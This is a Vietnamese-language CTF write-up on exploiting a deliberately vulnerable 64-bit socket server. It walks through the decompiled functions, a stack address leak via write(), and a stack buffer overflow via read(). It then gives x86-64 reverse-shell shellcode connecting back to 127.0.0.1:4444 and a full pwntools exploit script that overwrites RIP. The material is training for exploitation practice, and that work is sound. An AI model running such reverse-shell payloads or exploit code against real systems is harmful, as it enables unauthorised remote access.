### Overview

File được cung cấp: 
```
server 
```

Thông tin file:
```c
└─$ file server 
server: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d0d021e151b03d214104640ac29b16d37d74a02f, for GNU/Linux 3.2.0, not stripped

└─$ checksec --file=server
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   54 Symbols  No     0  
```
* file `elf 64-bit`
* file này thực thi được

```
file "server" này sẽ mô phỏng một Server đang hoạt động, và nhiệm vụ là khai thác lỗ hổng trên server và lấy flag 
```
___
### **server**

Các functions chính:
```c
0x0000000000401316  send_str
0x000000000040134c  input
0x000000000040139b  handle_client
0x00000000004014d0  main
```
Phân tích disassembly code trên ghidra:

`main()`
```c
void main(void)

{
  uint16_t port;
  int bindfd;
  sockaddr host_addr;
  undefined4 option_val;
  int true;
  int socketfd;
  
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  socketfd = socket(2,1,0);  //////
  if (socketfd < 0) {
    perror("socket");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  option_val = 1;
  setsockopt(socketfd,1,2,&option_val,4);  //////
  host_addr.sa_data[6] = '\0';
  host_addr.sa_data[7] = '\0';
  host_addr.sa_data[8] = '\0';
  host_addr.sa_data[9] = '\0';
  host_addr.sa_data[10] = '\0';
  host_addr.sa_data[0xb] = '\0';
  host_addr.sa_data[0xc] = '\0';
  host_addr.sa_data[0xd] = '\0';
                    /* AF_INET*/
  host_addr.sa_family = 2;  // AF_INET
  host_addr.sa_data[0] = '\0';
  host_addr.sa_data[1] = '\0';
  host_addr.sa_data[2] = '\0';
  host_addr.sa_data[3] = '\0';
  host_addr.sa_data[4] = '\0';
  host_addr.sa_data[5] = '\0';
  port = htons(1337);
  host_addr.sa_data._0_2_ = port;  // port
  bindfd = bind(socketfd,&host_addr,16);  //////
  if (bindfd < 0) {
    perror("bind");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  listen(socketfd,1);  //////
  printf("[*] Listening on port %d...\n",1337);
  do {
    do {
      true = accept(socketfd,(sockaddr *)0x0,(socklen_t *)0x0);  //////
    } while (true < 0);
    handle_client(true);  ////////////
  } while( true );
}
```
**Vai trò:**
* thực hiện listening đón chờ các connection
  
  <img width="807" height="97" alt="image" src="https://github.com/user-attachments/assets/17b6503a-dac0-4e41-833c-3b6a7da7488e" />

  * socket(): tạo socket
    ```c
    socketfd = socket(2,1,0);
    ```
  * setsockopt(): thiết lập cho socket; cho phép bind() sử dụng địa chỉ localhost (server)
    ```c
    // int setsockopt(int socket, int level, int option_name, const void *option_value, socklen_t option_len);
    
    option_val = 1;
    setsockopt(socketfd,1,2,&option_val,4);
    ```
    `option_name` = 2 => `SO_REUSEADDR`
    
    <img width="573" height="48" alt="image" src="https://github.com/user-attachments/assets/ac2e76be-0fc0-4f1f-b04e-a8f6d69b280a" />

  * bind(): gán địa chỉ kết nối localhost (ipv4, 1337) của server với socket
    ```c
    sockaddr host_addr; // 16 bytes
    
    struct sockaddr {
      sa_family_t sa_family;    // 2 - IPv4
      char        sa_data[14];  // port 1337 + padding null
    }
    ```
    ```c
    // int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    
    bindfd = bind(socketfd,&host_addr,16)
    ```
  * listen(): lắng nghe các phiên kết nối ngoài trên socket
    ```c
    // int listen(int sockfd, int backlog);
    listen(socketfd,1);
    ```
  * accept(): tạo một socket mới cho thiết bị kết nối đến, mà vẫn giữ socket đang listening ban đầu
    ```c
    // int accept(int sockfd, struct sockaddr *_Nullable restrict addr, socklen_t *_Nullable restrict addrlen);
    
    accept(socketfd,(sockaddr *)0x0,(socklen_t *)0x0);
    ```
    <img width="600" height="74" alt="image" src="https://github.com/user-attachments/assets/5650e00e-97b2-4867-b90d-2c20ab5ec0e5" />

* Khi mà có kết nối từ máy ngoài (user/client), thì thực hiện `handle_client()`:

  mô phỏng user/client trên một terminal khác:

  <img width="803" height="76" alt="image" src="https://github.com/user-attachments/assets/94ae8195-8560-45f7-a353-5d4b0647f9ae" />

`handle_client()`
```c
void handle_client(int fd)
{
  int match;
  size_t index;
  undefined1 buffer [512];
  char option [88];
  ssize_t rd;
  
  input(fd);
  while( true ) {
    send_str(fd,"Input something to start: ");
    rd = read(fd,option,80);
    if (rd == 0) break;
    index = strcspn(option,"\n");
    option[index] = '\0';
    match = strcmp(option,"write");
    if (match == 0) {
      write(fd,buffer,512);
      puts("sucess");
    }
    else {
      match = strcmp(option,"read");
      if (match == 0) {
        read(fd,buffer,3840);
        puts("sucess");
      }
      else {
        send_str(fd,"unknow command\n");
      }
    }
  }
  return;
}
```
`input()`
```c
undefined8 input(int fd)
{
  undefined1 buffer [768];
  
  send_str(fd,"input your name: ");
  read(fd,buffer,767);
  return 0;
}
```
* `input()` read() một giá trị lớn vào buffer
* `handle_client()`
  * có write() đọc dữ liệu thô từ stack, dùng để leak address
  * có read() vào buffer với size lớn hơn kích thước của buffer
    ```c
    undefined1 buffer [512];
    ...
    ...
    read(fd,buffer,3840);
    ```
    -> khả năng BOF ở đây, và có thể đẩy payload vào đây

Mô phỏng kết nối từ client bằng cách kết nối qua một terminal khác:

* client:

  <img width="803" height="193" alt="image" src="https://github.com/user-attachments/assets/69b2759e-f41d-491a-a056-08b1dcd7f882" />

* server:

  <img width="804" height="119" alt="image" src="https://github.com/user-attachments/assets/c126cf1c-4899-481f-ac79-9720f2fea27e" />

___
**Khai thác:**
* Ta sẽ write() trước để leak địa chỉ stack
* Tính offset đến buffer
* Sau đấy sẽ read(), đấy shellcode vào phần bộ nhớ của buffer trên stack
* overflow và overwrite RIP với địa chỉ buffer tính được

Thấy trên stack của ./server, có tồn tại địa chỉ stack, libc:
```asm
0x7fffffffda60: buffer
...
0x7fffffffdaa0 —▸ 0x7fffffffdbf0: địa chỉ trên stack 
0x7fffffffdaa8 —▸ 0x7ffff7e02290 (__printf_buffer_to_file_done+16): libc
0x7fffffffdab0 —▸ 0x7ffff7f905c0 (_IO_2_1_stdout_)
0x7fffffffdab8 —▸ 0x7ffff7e0cf99 (__vfprintf_internal+553): libc           
```
<img width="820" height="572" alt="image" src="https://github.com/user-attachments/assets/91a32c23-070c-4e87-abee-9ac8a0f0f92a" />

<img width="807" height="276" alt="image" src="https://github.com/user-attachments/assets/659023d4-142e-47cc-bff5-ac9501734244" />

Dùng địa chỉ stack tính offset đến buffer:

```asm
pwndbg> p/x 0x7fffffffdbf0 - 0x7fffffffda60
$1 = 0x190
```
<img width="821" height="68" alt="image" src="https://github.com/user-attachments/assets/41133c7b-ff42-472f-b713-ae45f9813812" />


Tạo payload với shellcode:
* kết nối về máy attacker qua socket
* chuyển các streams về máy attacker
* tạo shell

```asm
shellcode = asm("""
		mov rax, 41
		mov rdi, 2
		mov rsi, 1
		mov rdx, 0
		syscall

		mov rbx, rax

		mov rdx, 0x0100007f
		push rdx
		mov dx, 0x5c11
		push dx
		mov dx, 2 
		push dx

		mov rax, 42
		mov rdi, rbx 
		mov rsi, rsp 
		mov rdx, 16  
		syscall

		mov rax, 33
		mov rdi, rbx
		mov rsi, 0
		syscall

		mov rax, 33
		mov rdi, rbx
		mov rsi, 1
		syscall

		mov rax, 33
		mov rdi, rbx
		mov rsi, 2
		syscall

		mov rbx, 0x68732f6e69622f
		push rbx

		mov rax, 59
		mov rdi, rsp
		mov rsi, 0
		mov rdx, 0
		syscall
	""")
```
Bên cạnh đấy, padding payload cho đến RIP và overwrite với địa chỉ buffer tính được lúc nãy. Để khi chương trình thoát, RIP sẽ di chuyển đến buffer và thực thi shellcode ở đấy.
```
offset = RIP - buffer_addr
       = 616 (512 + 104)
```

Chọn option `read` để đẩy payload vào

Và trên stack bên server sẽ như sau:

<img width="804" height="598" alt="image" src="https://github.com/user-attachments/assets/ec2170c9-bda2-457a-ae3c-4970a74c314c" />

<img width="816" height="349" alt="image" src="https://github.com/user-attachments/assets/33833623-0401-4049-bbdd-4d2954aa2404" />

Giờ để RIP trỏ tới buffer đang chứa shellcode, ta  phải kích hoạt được:
```
    rd = read(fd,option,80);
    if (rd == 0) break;
```
bằng cách thoát chương trình, có thể dùng:
```
# dong ket noi de ham RET -> rip tro den shellcode
p.shutdown("send") 
```

và ta được shell:

<img width="811" height="244" alt="image" src="https://github.com/user-attachments/assets/ec0405bd-3f74-4f0b-9e90-de49006d781a" />


script:
```python
from pwn import *

context.arch = "amd64"
context.os   = "linux"
context.log_level = "debug"

p = remote("localhost", 1337)

p.recvuntil(b"input your name: ")
p.sendline(b"AAAA")

p.sendlineafter(b"Input something to start: ", b"write")

data_leak = p.recvuntil(b"Input something")

addr = data_leak[0x40:0x48]
addr = u64(addr.ljust(8, b"\x00"))
print(f"addr: {hex(addr)}")
buffer_addr = addr - 0x190
print(f"buffer_addr: {hex(buffer_addr)}")

# addr2 = data_leak[0x90:0x98]
# addr2 = u64(addr2.ljust(8, b"\x00"))
# print(f"addr2: {hex(addr2)}")
# buffer_addr2 = addr2 - 0xc0
# print(f"buffer_addr2: {hex(buffer_addr2)}")

shellcode = asm("""
		mov rax, 41
		mov rdi, 2
		mov rsi, 1
		mov rdx, 0
		syscall

		mov rbx, rax

		mov rdx, 0x0100007f
		push rdx
		mov dx, 0x5c11
		push dx
		mov dx, 2 
		push dx

		mov rax, 42
		mov rdi, rbx 
		mov rsi, rsp 
		mov rdx, 16  
		syscall

		mov rax, 33
		mov rdi, rbx
		mov rsi, 0
		syscall

		mov rax, 33
		mov rdi, rbx
		mov rsi, 1
		syscall

		mov rax, 33
		mov rdi, rbx
		mov rsi, 2
		syscall

		mov rbx, 0x68732f6e69622f
		push rbx

		mov rax, 59
		mov rdi, rsp
		mov rsi, 0
		mov rdx, 0
		syscall
	""")

nop_sleds = b"\x90" * 20 # just in case 
payload = nop_sleds + shellcode
payload += b"A" * (512 - len(payload))
## to rip
## offset_to_rip = 0x7fffffffdcc8 - 0x7fffffffda60
offset_to_rip = (616 - 512)
payload += b"A" * offset_to_rip

# da60
payload += p64(0x7fffffffda60)
print(f"payload_len: {len(payload)}")

p.sendlineafter(b"to start: ", b"read")
p.send(payload)

p.shutdown("send") # dong ket noi de ham RET -> rip tro den shellcode

p.interactive()
```
___
Tài liệu:

man3:
* setsockopt(): https://man.freebsd.org/cgi/man.cgi?setsockopt(2)
* bind(): https://man7.org/linux/man-pages/man2/bind.2.html
* accept(): https://man7.org/linux/man-pages/man2/accept.2.html




